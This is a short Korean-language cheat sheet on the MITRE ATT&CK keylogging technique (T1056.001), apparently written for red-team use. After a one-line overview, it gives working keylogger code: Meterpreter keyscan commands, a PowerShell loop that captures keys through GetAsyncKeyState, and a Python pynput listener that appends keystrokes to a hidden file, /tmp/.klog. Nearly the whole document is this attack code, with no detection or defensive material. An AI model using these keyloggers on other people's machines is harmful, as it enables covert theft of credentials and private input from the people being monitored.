# T1056.001 — Keylogging

## 개요

**TA0009 / T1056.001**  
키보드 입력을 로깅해 자격증명, 중요 정보를 탈취하는 기법.  
API Hook, Driver 기반, Raw Input 등 다양한 구현 방법 존재.

---

## 주요 커맨드

### Meterpreter Keylogger
```bash
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```

### PowerShell 키로거
```powershell
$API = Add-Type -MemberDefinition '
[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
' -Name "WinAPI" -PassThru

while($true) {
    Start-Sleep -Milliseconds 100
    for($i = 8; $i -le 255; $i++) {
        $state = $API::GetAsyncKeyState($i)
        if($state -eq -32767) {
            [System.Console]::Write([char]$i)
        }
    }
}
```

### Python 키로거 (Linux)
```python
from pynput import keyboard

def on_press(key):
    with open('/tmp/.klog', 'a') as f:
        f.write(str(key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```
